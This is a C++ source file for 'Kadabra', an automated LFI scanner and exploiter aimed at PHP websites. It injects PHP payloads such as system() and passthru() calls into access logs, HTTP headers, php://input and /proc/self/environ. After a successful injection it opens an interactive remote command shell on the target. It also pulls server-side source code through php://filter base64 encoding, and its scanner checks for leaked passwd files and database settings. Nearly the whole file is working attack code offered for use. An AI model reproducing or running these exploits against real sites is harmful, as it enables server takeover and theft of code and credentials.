/* 
 Kadabra v1.1_beta: LFI Exploiter and Scanner
 Author: D35m0nd142
*/

#include <iostream>
#include <cstring>
#include <string>
#include <fstream>
#include <sstream>
#include <vector>
#include <netdb.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/socket.h>
#define CHUNK_SIZE 65535
#define _BASE64_H_
using namespace std;

bool hackable;
string word;
vector <char> ext;
vector <char> finalext;

bool control(char i) {
    int t; t = (int) i;
    if((t >= 65 && t <= 90) || (t >= 97 && t <= 122) || (t >= 48 && t <= 57) || (t == 43) || (t == 47) || (t == 61)) return true;
    
    return false;
}

void twentytogap(string &cmd) {
    if(cmd.size() >= 3) {
        for(int x=0;x<cmd.size()-3;x++)
        if(cmd[x] == '%' && cmd[x+1] == '2' && cmd[x+2] == '0') {
            for(int y=x;y<cmd.size()-1;y++) cmd[y] = cmd[y+1];
            cmd.resize(cmd.size()-1);
            for(int y=x;y<cmd.size()-1;y++) cmd[y] = cmd[y+1];
            cmd.resize(cmd.size()-1);
            cmd[x] = ' ';
        }
    }
}

void find_get() {
    ifstream ifile;
    ifile.open("out.txt");
    string read;
    int nget = 0;
    int ngeto = 0;
    string snget;
    ostringstream convert;
    
    while(ifile.good()) {
        ifile >> read;
        if(read == "\"GET") nget++;
        if(read.size() >= 5 && read[0] == '/' && read[1] == 'u' && read[2] == 'i' && read[3] == 'd' && read[4] == '=')
        ngeto = nget;
    }
    
    ifile.close();
    convert << ngeto;
    snget = convert.str();
    ofstream ofile;
    ofile.open("nget.txt");
    ofile << snget;
    ofile.close();
}

void log_passthru(int nget) { // Extract content from out.txt obtained with passthru attack.
    string read, http = "HTTP/1.1\"";
    ifstream ifile;
    ifile.open("out.txt");
    vector <string> ext;
    
    while(ifile.good() && nget > 0) {
        ifile >> read;
        if(read == "\"GET") nget--;
    }
    
    while(ifile.good() && read != http) {
        ifile >> read;
        if(read != http) ext.push_back(read);
    }
    
    ifile.close();
    
    if(ext[0][0] == '/') {
        for(int i=0;i<ext[0].size()-1;i++)
        ext[0][i] = ext[0][i+1];
        ext[0].resize(ext[0].size()-1);
    }
    
    for(int i=0;i<ext.size();i++) {
        cout << ext[i] << " ";
    }
}

int filter_ext() {
    ifstream ifile;
    ofstream ofile;
    string temp, read;
    vector <string> ob;
    vector <int> sizes;
    int x=0,y=0;
    ifile.open("out.txt");
    ofile.open("b64.txt");
    
    while(ifile.good()) {
        x = 0;
        ifile >> read;
        temp.resize(read.size());
        for(int i=0;i<read.size();i++) {
            if(control(read[i])) {
                temp[x] = read[i];
                x++;
            } else {
                if(control(read[i]) == false && read[i] == '<' && (i >= read.size()/2)) 
					break;
                else x = 0;
            }
        }
        temp.resize(x);
        
        if(x != 0 && (x%4) == 0) {
            ob.push_back(temp);
            sizes.push_back(x);
        }
    }
    
    if(sizes.size() > 0) {
        x = sizes[0];
        y = 0;
        for(int i=0;i<sizes.size()-1;i++) {
            if(x < sizes[i+1]) {
                x = sizes[i+1];
                y = i+1;
            }
        }
        
        ofile << ob[y] << endl;
        
#ifdef DEBUG
        ifstream ifile2;
        ifile2.open("b64.txt");
        while(ifile2.good())
            ifile2 >> read;
        
        cout << "--------------------------------------------------------------------------------------------\n";
        cout << read << endl;
        cout << "--------------------------------------------------------------------------------------------\n";
        ifile2.close();
#endif
    }
    
    ofile.close();
    ifile.close();
    return 0;
}

// END attack module php://filter

// Base64 Decode START

static const string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}

string base64_decode(string &encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    string ret;
    
    while (in_len-- && ( encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i ==4) {
            for (i = 0; i <4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);
            
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            
            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }
    
    if (i) {
        for (j = i; j <4; j++)
            char_array_4[j] = 0;
        
        for (j = 0; j <4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);
        
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        
        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }
    return ret;
}

// Base64 Decode END

int phpinfo_gettmp() {
    ifstream ifile;
    ifile.open("out.txt");
    string read;
    int ntmp = 0;
    
    if(ifile) {
        while(ifile.good()) {
            getline(ifile,read);
            if(read.size() >= 9) {
                for(int i=0;i<read.size()-9;i++) {
                    if(read[i] == 't' && read[i+1] == 'm' && read[i+2] == 'p' && read[i+3] == '_' && read[i+4] == 'n' && read[i+5] == 'a' && read[i+6] == 'm' && read[i+7] == 'e' && read[i+8] == ']') {
                        ntmp++;
                        break;
                    }
                }
            }
        }
        
        ifile.close();
        ifstream ifile2; ifile2.open("out.txt");
        read = "nope";
        while(ifile2.good() && ntmp > 0) {
            getline(ifile2,read);
            if(read.size() >= 9) {
                for(int i=0;i<read.size()-9;i++) {
                    if(read[i] == 't' && read[i+1] == 'm' && read[i+2] == 'p' && read[i+3] == '_' && read[i+4] == 'n' && read[i+5] == 'a' && read[i+6] == 'm' && read[i+7] == 'e' && read[i+8] == ']') {
                        ntmp--;
                        break;
                    }
                }
            }
        }
        ifile2.close();
        cout << "[+] Got filename: " << read << endl;
    }
    return 0;
}

int receive_basic(int s) {
    int size_recv , total_size= 0;
    char chunk[CHUNK_SIZE];
    int a = 1; ofstream ofile; ofile.open("out.txt");
    
    while(1) {
        memset(chunk ,0 , CHUNK_SIZE);  //clear the variable
        if((size_recv =  recv(s , chunk , CHUNK_SIZE , 0) ) == 0)
            break;
        
        else {
            total_size += size_recv;
            ofile << chunk;
        }
    }
    ofile.close();
    return total_size;
}

int general_req(string host, const char *msg) {
    int status, total_size;
    struct addrinfo host_info;
    struct addrinfo *host_info_list;
    bool found; found = false;
    bool tobreak; tobreak = false;
    memset(&host_info, 0, sizeof host_info);
    host_info.ai_family = AF_INET;     
    host_info.ai_socktype = SOCK_STREAM;
    const char *hostc = host.c_str();
    status = getaddrinfo(hostc, "80", &host_info, &host_info_list);
    if (status != 0)  cout << "[!] getaddrinfo error" << gai_strerror(status) << endl;
    int socketfd ; 
    socketfd = socket(AF_INET,SOCK_STREAM,0);
    if (socketfd == -1)  { cout << "[!] socket error\n" ; exit(1); }
    status = connect(socketfd, host_info_list->ai_addr, host_info_list->ai_addrlen);
    if (status == -1)  { cout << "[!] connect error\n" ; exit(1); }
    int len;
    ssize_t bytes_sent;
    len = strlen(msg);
    struct timeval tv;
    tv.tv_sec = 90;
    setsockopt(socketfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(struct timeval));
    bytes_sent = send(socketfd, msg, len, 0);
    ssize_t bytes_recieved;
    total_size = receive_basic(socketfd);
    freeaddrinfo(host_info_list);
    return 0;
}

void phpinfo_ext() {
    ifstream ifile;
    ifile.open("out.txt");
    string read = "nope", read1 = "nope";
    string tofind = "";
    bool found = false;
    vector <char> temp;
    int i=0,j=0;

    while(ifile.good()) {
        // AbracadabrA
        read1 = read;
        ifile >> read;
        if(read.size() >= 12) {
            for(int i=0;i<read.size()-10;i++) {
                if(read[i] == 'A' && read[i+1] == 'b' && read[i+2] == 'r' && read[i+3] == 'a' && read[i+4] == 'c' && read[i+5] == 'a' && read[i+6] == 'd' && read[i+7] == 'a' && read[i+8] == 'b' && read[i+9] == 'r' && read[i+10] == 'A') {
                    found = true;
                    j = i+11;
                    break;
                }
            }
        }
        if(found == true) break;
    }

    if(found == true) {
        //cout << "[+] ABRACADABRA FOUND :) \n";
        if(read.size() >= j) {
            for(int i=j;i<read.size();i++) {
                if(read[i] == '<') break;
                else cout << read[i];
            }
        }
    
        read = "nope";
        bool ok = true;
        while(ifile.good() && ok == true) {
            getline(ifile,read);
            cout << endl;
            for(int i=0;i<read.size();i++) {
                if(read[i] == '<') {
                    ok = false;
                    break;
                } else 
					cout << read[i];
            }
        }
    }
}

bool grep(string line, string tofind)
{
    bool found = false;
    int t = 0, o;
    if(line.size() >= tofind.size())
    {
        for(int i=0;i<(line.size()-tofind.size()+1);i++)
        {
            //cout << "confronto " << line[i] << endl;
            if(line[i] == tofind[0])
            {
                found = true;
                t = 1;
                o = i+1;
                for(int j=i+1;j<(o+tofind.size()-1);j++)
                {
                    //cout << "confronto " << line[j] << " con " << tofind[t] << endl;
                    if(line[j] != tofind[t])
                    {
                        found = false;
                        break;
                    }
                    t++;
                }
            }
            if (found == true) break;
        }
    }
    if(found == true) return true;
    return false;
}

void phpinput(string owebsite, string path) {
    string msg, read, cmd = "nope";
    string slength;
    const char *req;
    cout << "[*] Generating the request ...\n";
    msg.resize(0); msg.append("POST "); msg.append(path);
    msg.append("php://input HTTP/1.1\r\n"); msg.append("Host: ");
    msg.append(owebsite); msg.append("\r\n"); msg.append("Content-Length: 38\r\n\n");
    msg.append("AbracadabrA <?system('uname -a'); ?>\r\n\r\n");
    req = msg.c_str();
    //cout << req << endl;
    general_req(owebsite,req);
    ifstream ifile; ifile.open("out.txt");
    bool ok = true, found = false, cat = false;
    int j = 0, righe = 0, punt = 0, length = 0;
    int w=0;
    while(ifile.good() && found == false) {
        getline(ifile,read);
        righe++;
        if(read.size() >= 11) {
            for(int i=0;i<read.size()-10;i++) {
                if(read[i] == 'A' && read[i+1] == 'b' && read[i+2] == 'r' && read[i+3] == 'a' && read[i+4] == 'c' && read[i+5] == 'a' && read[i+6] == 'd' && read[i+7] == 'a' && read[i+8] == 'b' && read[i+9] == 'r' && read[i+10] == 'A') {
                    found = true;
                    punt = i+12;
                }
            }
        }
    }
    ifile.close();
    
    if(found == true) {
        cout << "[*] The website seems to be vulnerable. Opening a SYSTEM shell ..\n";
        cout << "[i] WARNING: When you have to insert a space write %20 instead. \n";
        sleep(2);
        while(true) {
			if(cmd == "quit" || cmd == "exit")
				break;
            righe = 0; punt = 0;
            ok = true;
            cout << "\n?> "; cin >> cmd;
            if(cmd.size() >= 5) {
                for(int i=0;i<cmd.size()-5;i++) {
                    if(read[i] == 'c' && read[i+1] == 'a' && read[i+2] == 't' && read[i+3] == '%' && read[i+4] == '2') {
                        cat = true;
                        break;
                    } else 
						cat = false;
                }
            }
            twentytogap(cmd);
            length = 30; length = length + cmd.size() + 1;
            //slength = to_string(length);
            ostringstream convert;
            convert << length;
            slength = convert.str();
            msg.resize(0); msg.append("POST "); msg.append(path);
            msg.append("php://input HTTP/1.1\r\n"); msg.append("Host: ");
            msg.append(owebsite); msg.append("\r\n"); msg.append("Content-Length: "); msg.append(slength); msg.append("\r\n\n");
            msg.append("AbracadabrA <?system('");
            msg.append(cmd); msg.append("'); ?>\r\n\r\n");
            req = msg.c_str();
            general_req(owebsite,req);
            ifile.open("out.txt");
            while(ifile.good() && ok == true) {
                getline(ifile,read);
                righe++;
                if(read.size() >= 11) {
                    for(int i=0;i<read.size()-10;i++) {
                        if(read[i] == 'A' && read[i+1] == 'b' && read[i+2] == 'r' && read[i+3] == 'a' && read[i+4] == 'c' && read[i+5] == 'a' && read[i+6] == 'd' && read[i+7] == 'a' && read[i+8] == 'b' && read[i+9] == 'r' && read[i+10] == 'A') {
                            //cout << read << endl;
                            punt = i+12;
                            ok = false;
                            break;
                        }
                    }
                }
            }

            ok = true;
            for(int i=punt;i<read.size();i++) {
                if(read[i] == '<') {
                    ok = false;
                    break;
                } else 
					cout << read[i];
            }
            while(ifile.good() && ok == true) {
                getline(ifile,read);
                if(cat == true) cout << endl;
                else cout << " ";
                for(int i=0;i<read.size();i++) {
                    if(read[i] == '<') {
                        ok = false;
                        break;
                    } else 
						cout << read[i];
                }
            }
            cout << "\n";
            ifile.close();
        }
    }
}

void log_get_ext() {
    ifstream ifile;
    ifile.open("out.txt");
    string read;
    vector <string> ext;
    string http = "HTTP/1.1\"";
    int nget; nget=0;
    while(ifile.good()) {
        ifile >> read;
        if(read == "\"GET") nget++;
    }
    
    ifile.close();
    ifile.open("out.txt");
    while(ifile.good() && nget > 0) {
        ifile >> read;
        if(read == "\"GET") nget--;
    }
    
    while(ifile.good() && read != http) {
        ifile >> read;
        if(read != http) ext.push_back(read);
    }
    
    ifile.close();
    
    if(ext[0][0] == '/') {
        for(int i=0;i<ext[0].size()-1;i++)
        ext[0][i] = ext[0][i+1];
        ext[0].resize(ext[0].size()-1);
    }
    
    for(int i=0;i<ext.size();i++) {
        cout << ext[i] << " ";
    }
}

void access_control_get(bool &hackable) {
    string read;
    ifstream ifile; ifile.open("out.txt");
    while(ifile.good()) {
        getline(ifile,read);
        if(read.size() >= 9) {
            for(int i=0;i<read.size()-9;i++) {
                if(read[i] == 'G' && read[i+1] == 'E' && read[i+2] == 'T' && read[i+3] == ' ' && read[i+4] == '/' && read[i+5] == 'u' && read[i+6] == 'i' && read[i+7] == 'd' && read[i+8] == '=') {
                    hackable = true;
                    break;
                }
            }
        }
        
        if(hackable == true) break;
        if(hackable == false && read.size() >= 14) {
            for(int i=0;i<read.size()-14;i++) {
                if(read[i] == 'U' && read[i+1] == 's' && read[i+2] == 'a' && read[i+3] == 'g' && read[i+4] == 'e' && read[i+5] == ' ' && read[i+6] == 'o' && read[i+7] == 'f' && read[i+8] == ' ' && read[i+9] == 'i' && read[i+10] == 'd' && read[i+11] == ' ' && read[i+12] == 'b' && read[i+13] == 'y') {
                    hackable = true;
                    break;
                }
            }
        }
    }
    ifile.close();
}

void access_control_head(bool &hackable) {
    string read;
    ifstream ifile; ifile.open("out.txt");
    while(ifile.good()) {
        getline(ifile,read);
        if(read.size() >= 10) {
            for(int i=0;i<read.size()-10;i++) {
                if(read[i] == 'H' && read[i+1] == 'E' && read[i+2] == 'A' && read[i+3] == 'D' && read[i+4] == ' ' && read[i+5] == '/' && read[i+6] == 'u' && read[i+7] == 'i' && read[i+8] == 'd' && read[i+9] == '=') {
                    hackable = true;
                    break;
                }
            }
        }
        
        if(hackable == true) break;
        if(hackable == false && read.size() >= 14) {
            for(int i=0;i<read.size()-14;i++) {
                if(read[i] == 'U' && read[i+1] == 's' && read[i+2] == 'a' && read[i+3] == 'g' && read[i+4] == 'e' && read[i+5] == ' ' && read[i+6] == 'o' && read[i+7] == 'f' && read[i+8] == ' ' && read[i+9] == 'i' && read[i+10] == 'd' && read[i+11] == ' ' && read[i+12] == 'b' && read[i+13] == 'y') {
                    hackable = true;
                    break;
                }
            }
        }
    }
    ifile.close();
}

void log_head_ext() {
    ifstream ifile;
    ifile.open("out.txt");
    string read;
    vector <string> ext;
    string http = "HTTP/1.1\"";
    int nget; nget=0;
    while(ifile.good()) {
        ifile >> read;
        if(read == "\"HEAD") nget++;
    }
    // nget tell me which is the last HEAD to use
    ifile.close();
    ifile.open("out.txt");
    while(ifile.good() && nget > 0) {
        ifile >> read;
        if(read == "\"HEAD") nget--;
    }
    
    while(ifile.good() && read != http) {
        ifile >> read;
        if(read != http) ext.push_back(read);
    }
    
    ifile.close();
    
    if(ext[0][0] == '/') {
        for(int i=0;i<ext[0].size()-1;i++)
            ext[0][i] = ext[0][i+1];
        ext[0].resize(ext[0].size()-1);
    }
    
    for(int i=0;i<ext.size();i++) {
        cout << ext[i] << " ";
    }
}


void access_log(string owebsite, string path) {
    int nget = 0;
    string msg,read,cmd = "nope";
    const char *req;
    bool hackable = false;
    msg.append("GET /<?php system('id'); ?> HTTP/1.1\r\nHost: "); msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
    req = msg.c_str();
    general_req(owebsite,req);
    msg.resize(0); msg.append("GET "); msg.append(path); msg.append(" HTTP/1.1\r\n"); msg.append("Host: "); msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
    req = msg.c_str();
    general_req(owebsite,req);
    access_control_get(hackable);
    
    if(hackable == true) {
        cout << "[+] The website seems to be vulnerable. Opening a SYSTEM shell ..\n";
        cout << "[i] WARNING: When you have to insert a space write %20 instead. \n";
        sleep(2);
        while(cmd != "quit" && cmd != "exit") {
            cout << "\n?> ";
            cin >> cmd;
            if(cmd != "quit" && cmd != "exit") {
                msg.resize(0); msg.append("GET /<?php system('");
                twentytogap(cmd);
                msg.append(cmd); msg.append("'); ?> HTTP/1.1\r\n");
                msg.append("Host: "); msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
                req = msg.c_str();
                general_req(owebsite,req);
                msg.resize(0); msg.append("GET "); msg.append(path); msg.append(" HTTP/1.1\r\n"); msg.append("Host: "); msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
                req = msg.c_str();
                general_req(owebsite,req);
                log_get_ext();
            }
        }
    }
    
    if(hackable == false) {
        // Second way attack: PASSTHRU
        cout << "\n[-] GET Method did not work! Running second attack using 'passthru' method...\n";
        sleep(2);
        msg.resize(0); msg.append("GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1\r\nHost: ");
        msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
        req = msg.c_str();
        general_req(owebsite,req);
        msg.resize(0); msg.append("GET "); msg.append(path); msg.append("&cmd=id HTTP/1.1\r\n");
        msg.append("Host: "); msg.append(owebsite); msg.append("\r\n\r\n");
        req = msg.c_str();
        general_req(owebsite,req);
        access_control_get(hackable);
        
        if(hackable == true) {
            find_get();
            ifstream ifile2; ifile2.open("nget.txt");
            ifile2 >> read;
            stringstream str(read);
            str >> nget;
            cmd = "nope";
            cout << "[+] The website seems to be vulnerable. Opening a SYSTEM shell ..\n";
            cout << "[i] WARNING: When you have to insert a space write %20 instead. \n";
            sleep(2);
            while(cmd != "quit" && cmd != "exit") {
                cout << "\n?> ";
                cin >> cmd;
                if(cmd != "quit" && cmd != "exit") {
                    msg.resize(0); msg.append("GET "); msg.append(path); msg.append("&cmd="); msg.append(cmd);
                    msg.append(" HTTP/1.1\r\n"); msg.append("Host: "); msg.append(owebsite); msg.append("\r\n\r\n");
                    req = msg.c_str();
                    general_req(owebsite,req);
                    log_passthru(nget);
                }
            }
        }
        else cout << "\n[-] Even the second method did not work! ";
    }
    
    // 3rd way: HEAD Requests
    if(hackable == false) {
        cout << "Running third method using HEAD requests..\n";
        sleep(2);
        msg.resize(0); msg.append("HEAD /<?php system('id'); ?> HTTP/1.1\r\nHost: "); msg.append(owebsite);
        msg.append("\r\nConnection: close\r\n\r\n");
        req = msg.c_str();
        cout << "\n[*] Generating request ...\n";
        general_req(owebsite,req);
        msg.resize(0); msg.append("GET "); msg.append(path); msg.append(" HTTP/1.1\r\n"); msg.append("Host: "); msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
        req = msg.c_str();
        general_req(owebsite,req);
        access_control_head(hackable);
        
        if(hackable == true) {
            cout << "[+] The website seems to be vulnerable. Opening a SYSTEM shell ..\n";
            cout << "[i] WARNING: When you have to insert a space write %20 instead. \n";
            cmd = "nope";
            sleep(2);
            while(cmd != "quit" && cmd != "exit") {
                cout << "\n$> ";
                cin >> cmd;
                if(cmd != "quit" && cmd != "exit") {
                    twentytogap(cmd);
                    msg.resize(0); msg.append("HEAD /<?php system('"); msg.append(cmd); msg.append("'); ?> HTTP/1.1\r\nHost: "); msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
                    req = msg.c_str();
                    general_req(owebsite,req);
                    msg.resize(0); msg.append("GET "); msg.append(path); msg.append(" HTTP/1.1\r\n"); msg.append("Host: "); msg.append(owebsite); msg.append("\r\nConnection: close\r\n\r\n");
                    req = msg.c_str();
                    general_req(owebsite,req);
                    log_head_ext();
                }
            }
        }
    }
}

void clean() { // It removes all used files during the execution of the program.
    remove("nget.txt"); remove("out.txt"); remove("b64.txt");
    exit(0);
}

bool isup(char c) {
    int i = (int) c;
    if((i >= 64 && i <= 90) || i == 95) 
		return true;
    return false;
}

bool ctrl(string read, int index) {
	int j = 0;
	int i = index;
	while(j < word.size()) {
		if(read[i++] != word[j++])
			return false;
	}
	return true;
}

string getTranslatedPar() { // if you enter another word, you will probably bump into an incorrect behavior of the program (in other words it will not work :) )
	if (word == "HTTP_REFERER=")
		return "Referer";
	else if(word == "HTTP_COOKIE=")
		return "Cookie";
	else if(word == "HTTP_HOST=")
		return "Host";
	else if(word == "HTTP_ACCEPT=")
		return "Accept";
	else if(word == "HTTP_ACCEPT_LANGUAGE=")
		return "Accept-Language";
	else if(word == "HTTP_ACCEPT_ENCODING=")
		return "Accept-Encoding";
	else if(word == "HTTP_CONNECTION=")
		return "Connection";
	else
		return "User-Agent";
}

void self_environ(string cmd, string owebsite, string path) {
    string read, msg;
    const char * req;
    ifstream ifile;
    bool vuln = false, cont = true;
    int i = 0, punt = 0;
    vector <char> ext;
    vector <char> finalext;
	hackable = false;

    cout << "[*] Generating request ...\n";	
    msg.resize(0); 
    msg.append("GET "); msg.append(path); 
    msg.append(" HTTP/1.1\r\nHost: "); msg.append(owebsite);
    msg.append("\n\n"); msg.append(getTranslatedPar()); msg.append(": <?php system('");
    msg.append(cmd); msg.append("'); ?>\r\nConnection: close\r\n\r\n");
    req = msg.c_str();
    //cout << msg << endl;
    general_req(owebsite,req);
    ifile.open("out.txt");
	
	while(ifile.good() && vuln == false) {
        getline(ifile,read);
        if(read.size() >= word.size()) 
            for(i=0;i<read.size()-word.size();i++) {
                if(ctrl(read, i)) {
					vuln = true;
					//cout << "[*] " << word << " FOUND :) \n\n";
                    break;
				}
            }
    }

	if(vuln == false) 
		cout << "[-] " << word << " not found!\n"; 
	else {
        punt = i+word.size();
        ifile.close(); ifile.open("env1.txt");
        for(int j=punt; j<read.size(); j++) {
            if(read[j] == '=') {
				if(j > 0 && isup(read[j-1])) {
					cont = false;
					break;
				}
				ext.push_back(read[j]);
            }
            ext.push_back(read[j]);
        }
	
		for(int i=ext.size()-1;i>=0;i--) {
			if(isup(ext[i]))
				ext.pop_back();
			else break;
		}
	
		if(ext[0] == 'a' && ext[1] == 'b' && ext[2] == 'r' && ext[3] == 'a' && ext[4] == 'c' && ext[5] == 'a') {
			hackable = true;
			for(int i=12;i<ext.size();i++) 
				finalext.push_back(ext[i]);
		} else {
			cout << "[-] Attack not successful :( " << endl;
		}
	}
}


int main(int argc, char *argv[]) {
    string choice = "z";
    string infopath;
    string choice1 = "z",website,owebsite,path,msg,headers,msgshort,ucmd,scan,page="nope",dec_str;
    string read;
    const char *req;
    ifstream ifile2;
    cout << "\n KadabrA v1.1_beta\n";
    cout << " Automatic LFI scanner and exploiter\n";
    cout << " Author: D35m0nd142\n\n";
    
    while(choice[0] != 'x') {
        cout << "-----------------------------\n";
        cout << " a) Simple LFI scan          \n";
        cout << " b) Hack!                    \n";
        cout << " x) Exit                     \n";
        cout << "-----------------------------\n";
        cout << " -> ";
        cin >> choice;
        
        if(choice[0] == 'x') clean();
        if(choice[0] == 'a') {
            cout << "[*] Enter the website without http:// -> ";
            cin >> owebsite;
            cout << "[*] Enter the LFI path -> ";
            cin >> path;
            ifstream ifile;
            ifile.open("pathtotest.txt");
            cout << "\nUse: \n";
            cout << "-----------------------------------\n";
            cout << " i) Internal script [quite slow] \n";
            cout << " e) External python script [faster] \n";
            cout << "-----------------------------------\n";
            cout << " -> ";
            cin >> ucmd;
            if(ucmd[0] == 'i' || ucmd[0] == 'I') {
                cout << "[*] Scanning ... \n\n";
                while(ifile.good()) {
                    ifile >> read;
                    msg = "GET ";
                    msgshort.resize(0);
                    msg.append(path); msg.append(read); msgshort.append(msg); msg.append(" HTTP/1.1\r\n");
                    msg.append("Host: "); msg.append(owebsite); msg.append("\r\n\r\n");
                    req = msg.c_str();
                    general_req(owebsite,req);
                    ifile2.open("out.txt");
                    cout << "[*] " << msgshort << endl;
                    while(ifile2.good()) {
                        getline(ifile2,read);
                        if(grep(read,"root:") || (grep(read,"sbin") && grep(read,"nologin")) || grep(read,"DB_NAME") || grep(read,"daemon:") || grep(read,"HTTP_ACCEPT_ENCODING=") || grep(read,"PATH=") || grep(read,"HTTP_USER_AGENT=") || (grep(read,"GET /") && (grep(read,"HTTP/1.1") || grep(read,"HTTP/1.0"))) || grep(read,"cpanel/logs/access") || grep(read,"database_prefix=") || grep(read,"allow_login_autocomplete") || grep(read,"adminuser=") || grep(read,"apache_port=")) {
                                cout << " [VULNERABLE]\n";
                                break;
                            } else
								msgshort = msgshort;
                    }
                    ifile2.close();
                }
            }
            
            else {
                cout << "[*] Scanning ... \n\n";
                scan  = "python lfi_scan.py ";
                scan.append(owebsite); scan.append(path);
                system(scan.c_str());
            }
            ifile.close();
        }
        
        else {
            choice1 = "nope";
            cout << "____________________________\n\n";
            cout << " Hack ways:                 \n";
            cout << "____________________________\n\n";
            cout << " a) /proc/self/environ      \n";
            cout << " b) php://filter            \n";
            cout << " c) php://input             \n";
            cout << " d) /proc/self/fd           \n";
            cout << " e) access log injection    \n";
            cout << " f) phpinfo injection       \n";
            cout << " x) back                    \n";
            cout << "____________________________\n";
            cout << " -> ";
            cin >> choice1;
            cout << "[*] Enter the target without http:// -> ";
            cin >> owebsite;
            
            switch(choice1[0]) {
				case 'a':
                    cout << "[*] Enter the LFI path -> ";
					cin >> path;
					cout << "[*] Enter the parameter you want try to hack (default: \"HTTP_USER_AGENT=\") -> ";
					cin >> word;
					for(int i=0;i<word.size();i++) {
						if(!isup(word[i])) {
							word = "HTTP_USER_AGENT=";
							break;
						}
					}
					if(word.size() == 0) word = "HTTP_USER_AGENT=";
					if(word[word.size()-1] != '=')
						word = word + "=";
					ucmd = "id";
					self_environ(ucmd, owebsite, path);
	
					if(hackable == true) {
						ucmd = "nope";
						finalext.resize(0);
						ext.resize(0);
						cout << "[+] The website seems to be vulnerable. Opening a SYSTEM shell ..\n";
            
						while(ucmd != "quit" && ucmd != "exit") {
							cout << "\n?> ";
							cin >> ucmd;
							self_environ(owebsite, ucmd, path);
						}	
					}
					break;
				
				case 'd':
					cout << "Working on it... Use your brain for the time being :) \n\n";
					break;
				
                case 'c':
                    cout << "[*] Enter the LFI path -> ";
                    cin >> path;
                    phpinput(owebsite,path);
                    break;
                    
                case 'e':
                    cout << "[*] Enter the LFI path -> ";
                    cin >> path;
                    // First trying with GET Request
                    cout << "[*] Generating request ...\n";
                    access_log(owebsite,path);
                    break;
                
                case 'f':
                    cout << "[*] Enter the phpinfo path -> ";
                    cin >> infopath;
                    msg = "python phpinfo.py "; msg.append(owebsite); msg.append(" "); msg.append(infopath);
                    system(msg.c_str());
                    break;
                    
                case 'b':
                    cout << "[*] Enter the LFI path -> ";
                    cin >> path;
                    cout << "[*] Trying to steal information using php://filter method ...\n";
                    path.append("php://filter/convert.base64-encode/resource=");
                    
                    while(page[0] != '0') {
                        cout << "[*] Enter the page of which you want the php content (0 for stop) -> ";
                        cin >> page;
                        if(page[0] != '0') {
                            msg = "GET ";
                            msg.append(path);
                            msg.append(page);
                            msg.append(" HTTP/1.1\r\n");
                            msg.append("Host: ");
                            msg.append(owebsite);
                            msg.append("\r\n\r\n");
                            req = msg.c_str();
                            
                            #ifdef DEBUG
                                cout << "request: \n";
                                cout << req << endl << endl;
                            #endif
                            
                            general_req(owebsite,req);
                            filter_ext();
                            ifstream b64filei; b64filei.open("b64.txt");
                            
                            while(b64filei.good())
                                b64filei >> read;
                            b64filei.close();
                            
                            if(read.size() < 150) 
								cout << "\n[-] Any interesting Base64 codes detected.\n";
                            else { 
                                ifstream b64file; b64file.open("b64.txt");
                                cout << "\n[+] Possible Base64 code found.\n";
                                cout << "[*] Do you want to view it? (y/n) ";
                                cin >> ucmd;
                                
                                if(ucmd == "y" || ucmd == "Y") cout << "----------------------------------------------------------------------------\n";
                            
                                while(b64file.good()) {
                                    b64file >> read;
                                    if(ucmd == "y" || ucmd == "Y")  cout << read;
                                }
                                
                                if(ucmd == "y" || ucmd == "Y") cout << "\n----------------------------------------------------------------------------\n";
                            
                                cout << "[*] Do you wanna decrypt it? (y/n) ";
                                cin >> ucmd;
                                if(ucmd == "y" || ucmd == "Y") {
                                    cout << "[*] Decrypting text, wait please ...\n";
                                    sleep(2);
                                    b64file.close();
                                    for(int z=0;z<read.size()-3;z++) {
                                        if(read[z] == '%' && read[z+1] == '2' && read[z+2] == '0') {
                                            read[z] = ' ';
                                            for(int x=0;x<2;x++)
                                            {
                                                for(int w=z+1;w<read.size()-1;w++) read[w] = read[w+1];
                                                read.resize(read.size()-1);
                                            }
                                        }
                                    }
                                
                                    dec_str = base64_decode(read);
                                    cout << "\n[+] Decoded snippet: \n";
                                    cout << "________________________________________________________________________________________________________________\n";
                                    cout << dec_str << endl;
                                    cout << "________________________________________________________________________________________________________________\n\n";
                                }
                            }
                        }
                    }
                    break;
            }
        }
    }
}
